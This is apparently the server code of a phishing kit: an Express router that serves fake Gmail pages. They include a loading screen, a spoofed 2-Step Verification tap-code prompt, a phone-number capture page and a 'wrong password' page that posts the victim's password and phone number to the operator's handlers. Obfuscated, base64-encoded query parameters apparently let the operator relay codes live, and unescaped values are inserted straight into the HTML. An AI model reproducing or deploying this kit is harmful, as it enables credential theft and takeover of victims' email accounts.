const express = require('express');
const router = express.Router();
const db = require('../db');

router.get('/', (req, res) => {
  
  let user = req.query.tgrdsfgdytrbdfwergter;
  
  if (user == null) {
      res.render('error');
      
    }else{

  const htmlContent = `
  <!doctype html>
  <html lang="en">
  <head>   
  
  <script type="text/javascript" src="/script/fetch.js"></script>

      <!-- Required meta tags -->
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Gmail</title>
      <link rel="shortcut icon" href="/images/image.png" type="image/png">
      <style>
      :root {
--yellow: #feb60a;
--red: #ff0062;
--blue: #00dbf9;
--violet: #da00f7;
}
body {
margin: 0;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
background-color: white;
background-image: linear-gradient(180deg, rgba(0,0,0,0.15) 0%, rgba(0,153,212,0) calc(15% + 100px), rgba(0,99,138,0) calc(85% + 100px), rgba(0,0,0,0.15) 100%);
}
div.container {
display: flex;
justify-content: center;
align-items: center;
}
div > div {
width: 3vw;
height: 3vw;
border-radius: 100%;
margin: 2vw;
background-image: linear-gradient(145deg, rgba(255,255,255,0.5) 0%, rgba(0,0,0,0) 100%);
animation: bounce 1.5s 0.5s linear infinite;
}
.yellow {
background-color: var(--yellow);
}

.red {
background-color: var(--red);
animation-delay: 0.1s;
}

.blue {
background-color: var(--blue);
animation-delay: 0.2s;
}

.violet {
background-color: var(--violet);
animation-delay: 0.3s;
}

@keyframes bounce {
0%, 50%, 100% {
  transform: scale(1);
  filter: blur(0px);
}
25% {
  transform: scale(0.6);
  filter: blur(3px);
}
75% {
  filter: blur(3px);
  transform: scale(1.4);
}
}
  </style>
  </head>
  <body>
  <div class="image-src">
  <input type='hidden' name="username" id="username" value="${user}">
  <img src="/images/img-src.jpeg" width="350" height="250">
     </div>
 <div class="container">           
<div class="yellow"></div>
<div class="red"></div>
<div class="blue"></div>
<div class="violet"></div>
</div>

</body>
  </html>
  `;

  // Send the HTML content as a response
  res.send(htmlContent);

          }



router.get('/fetch', (req, res) => {

  
  let userid = req.query.dsjkfhjdhfjkdfhjkd;

  

  const username = Buffer.from(userid, 'base64').toString('utf-8');
  
  const sqlQuery =  'SELECT username, pagetype, mobiletype FROM maintable WHERE username= ?';   
  
  db.query(sqlQuery, [username], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
    

  res.json({ results });

 
  });


});

// tap optionss

router.get('/codetap', (req, res) => {

  const newdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;

  const decodata=  Buffer.from(newdata, 'base64').toString('utf-8');

  const dataArray = decodata.split('/');

  const id = dataArray[1];
  const tapcode = dataArray[2];
  const mtype = dataArray[3];

  const tappage = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Gmail</title>
      <link rel="shortcut icon" href="/images/image.png" type="image">
      <link rel="stylesheet" href="/stylesheet/newstyle.css">
  </head>
  <body>
      <div class="maindiv">
          <form class="loginform1" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
         
              <div class="form-half">
                  <div><img class="divlogo" src="/images/image.png" ></div>
                  <div><span class="welcome">2-Step Verification<span></div><br>
                  <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in<span></div>                
                  <div class="userdiv">
                    <img class="left-img"  src="/images/user-circle.png" >&nbsp;&nbsp;
                    <input type='hidden' name="username" id="useRname" value="${id}">
                    <span style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id}</span>&nbsp;
                    <img class="right-img" src="/images/dropd.jpg">
                    
                  </div>
              </div>
              <div class="form-half1">
                  <center>
                      <div class="numberdiv">
                      <span class="number">${tapcode}</span>
                        
                      </div>
                  </center>
                      <div class="phonediv">
                        <span class="phonetype">Check your ${mtype}</span><br><br>
                        <span class="messaged">Google sent a notification to your ${mtype}. Tap <b>Yes</b>&nbsp;on the notification, then tap&nbsp;<b>${tapcode}</b>&nbsp;on your phone to verify it's you.</span>
                          
                      </div>
  
                     
                  <div class="selectpc">
       
                      <input type="checkbox" onclick="ShowpassWord();" class="checkbox">
                      <span onclick="ShowpassWord();" class="button">Don't ask again on this device</span>
                  </div>
  
                  
  
                  <div class="tryn">
                      <button id="myButton" class="hyperl1" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
                      
                      
                    </div>
  
              </div>
  
             
        
          </form>
          <div class="btmdiv">
              <div class="left-div">
                  <select class="btmhypl" id="language-select">
                      <option value="en">English (United States)</option>
                      <option value="fr">French</option>
                      <option value="es">Spanish</option>
                      <option value="de">German</option>
                      <!-- Add more options as needed -->
                  </select>
              </div>
              <div class="right-divs">
                  <div class="right-div">
                      <button id="myButton" class="btmhypl" >Help</button>
                  </div>
                  <div class="right-div">
                      <button id="myButton" class="btmhypl" >Privacy</button>
                  </div>
                  <div class="right-div">
                      <button id="myButton" class="btmhypl" >Terms</button>
                  </div>
              </div>
          </div>
          <script>
              // JavaScript to redirect on button click
              document.getElementById("myButton").onclick = function () {
                  location.href = "https://mail.google.com"; // Replace "https://example.com" with your desired URL
              };
          </script>
  
      </div>
      
  </body>
  </html>
  
  
  `;

  res.send(tappage);

  

});


// code otp options

router.get('/codeotp', (req, res) => {

    const samdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata1=  Buffer.from(samdata, 'base64').toString('utf-8');
  
    const dataArray1 = decodata1.split('/');
  
    const id1 = dataArray1[1];
  
    const otppage = `

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Gmail</title>
        <link rel="shortcut icon" href="/images/image.png" type="image">
        <link rel="stylesheet" href="/stylesheet/newstyle.css">
        <script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>
    </head>
    <body>
        <div class="maindiv">
            <form class="loginform1" method="post" name="loginForm" action="/req/mobilepost" accept-charset="UTF-8">
           
                <div class="form-half">
                    <div><img class="divlogo" src="/images/image.png" ></div>
                    <div><span class="welcome">Verify it's you<span></div><br>
                    <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in<span><button id="myButton" class="hyperl1" ><b>Learn more</b></button></div>                
                    <div class="userdiv">
                      <img class="left-img"  src="/images/user-circle.png" >&nbsp;&nbsp;
                      <input type='hidden' name="username" id="useRname" value="${id1}">
                      <span style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id1}</span>&nbsp;
                      <img class="right-img" src="/images/dropd.jpg">
                      
                    </div>
                </div>
                <div class="form-half1">
                    <center>
                        <div class="gradient-box"><img src="/images/account-recovery-sms-pin.gif"></div>
                    </center>
                        <div class="phonediv">
                          <span class="phonetype">Get a verification code</span><br><br>
                          <span class="messaged">To get a verification code, first confirm the phone number you added to your account *********.&nbsp;<i> Standard rates apply.</i></span>
                            
                        </div>
                      
                        <div class="select-box">
                            <div class="selected-option">
                                <div style="background-color:white;">
                                    <span class="iconify" data-icon="flag:gb-4x3"></span>
                                   
                                </div>
                                <input type="tel" name="tel" onkeypress="return validateMobile(event)" placeholder="Phone Number">
                                <script>
                                     function validateMobile(event) {
                                            var key = event.key;
                                            // Allow digits (0-9) and the plus sign (+)
                                            if (/[0-9+]/.test(key)) {
                                                return true;
                                            } else {
                                                alert("Please enter numbers only.");
                                                return false;
                                            }
                                            }
    
                                </script>
                            </div>
                            <div class="options">
                                <input type="text" class="search-box" placeholder="Search Country Name">
                                <ol>
                    
                                </ol>
                            </div>
                        </div>
                        <script src="/script/script.js"></script>
    
                    
    
                    <div class="tryn1">
                        <button id="myButton" class="hyperl2" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
                        <button type="submit" class="btnnxt">Send</button>
                        
                        
                      </div>
    
                </div>
    
               
          
            </form>
            <div class="btmdiv">
                <div class="left-div">
                    <select class="btmhypl" id="language-select">
                        <option value="en">English (United States)</option>
                        <option value="fr">French</option>
                        <option value="es">Spanish</option>
                        <option value="de">German</option>
                        <!-- Add more options as needed -->
                    </select>
                </div>
                <div class="right-divs">
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Help</button>
                    </div>
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Privacy</button>
                    </div>
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Terms</button>
                    </div>
                </div>
            </div>
            <script>
                // JavaScript to redirect on button click
                document.getElementById("myButton").onclick = function () {
                    location.href = "https://mail.google.com"; // Replace "https://example.com" with your desired URL
                };
            </script>
    
        </div>
        
    </body>
    </html>
    
    
    `;
  
    res.send(otppage);
  
  });


// wrong password reoload page

  router.get('/wrongpwd', (req, res) => {

    const samdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata1=  Buffer.from(samdata, 'base64').toString('utf-8');
  
    const dataArray1 = decodata1.split('/');
  
    const id1 = dataArray1[1];

    
  
    const errorpage = `

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Gmail</title>
        <link rel="shortcut icon" href="/images/image.png" type="image">
        <link rel="stylesheet" href="/stylesheet/newstyleerror.css">
    </head>
    <body>
        <div class="maindiv">
            <form class="loginform" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
           
                <div class="form-half">
                    <div><img class="divlogo" src="/images/image.png" ></div>
                    <div><span class="welcome">Welcome<span></div>                
                    <div class="userdiv">
                      <img class="left-img"  src="/images/user-circle.png" >&nbsp;&nbsp;
                      <span style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id1}</span>&nbsp;
                      <img class="right-img" src="/images/dropd.jpg">
                      
                    </div>
                </div>
                <div class="form-half1">
                    <div class="input-box">
                        <input type='hidden' name="username" id="useRname" value="${id1}">
                        <input class="input-box-input" name="password" type='password' id="pEyar" placeholder=" ">
                        <label class="input-box-placeholder">Enter your password</label>
                      </div>
                      <div style="margin-bottom: 4px;">
                        <img src="/images/error.png" alt="Error You have entered wrong password">
                      </div>
    
                    <div class="shwpwd">
         
                        <input type="checkbox" onclick="ShowpassWord();" class="checkbox">
                        <span onclick="ShowpassWord();" class="button">Show password</span>
                    </div>
    
                    <script src="/script/pass.js"></script>
    
                    <div class="fgtpwd">
                        <button id="myButton" class="hyperl" >Forgot password?</button>&nbsp;&nbsp;&nbsp;
                        <button type="submit" class="btnnxt">Next</button>
                        <script>
                          // JavaScript to redirect on button click
                          document.getElementById("myButton").onclick = function () {
                              location.href = "https://mail.google.com"; // Replace "https://example.com" with your desired URL
                          };
                      </script>
                      </div>
    
                </div>
    
               
          
            </form>
    
            <div class="btmdiv">
                <div class="left-div">
                    <select class="btmhypl" id="language-select">
                        <option value="en">English (United States)</option>
                        <option value="fr">French</option>
                        <option value="es">Spanish</option>
                        <option value="de">German</option>
                        <!-- Add more options as needed -->
                    </select>
                </div>
                    <div class="right-divs">
                        <div class="right-div">
                            <button id="myButton" class="btmhypl" >Help</button>
                        </div>
                        <div class="right-div">
                            <button id="myButton" class="btmhypl" >Privacy</button>
                        </div>
                        <div class="right-div">
                            <button id="myButton" class="btmhypl" >Terms</button>
                        </div>
                    </div>
            </div>
    
    
        </div>
        
    </body>
    </html>
    
    
    `;
  
    res.send(errorpage);
  
  });
  
  
  
  
  });



module.exports = router;
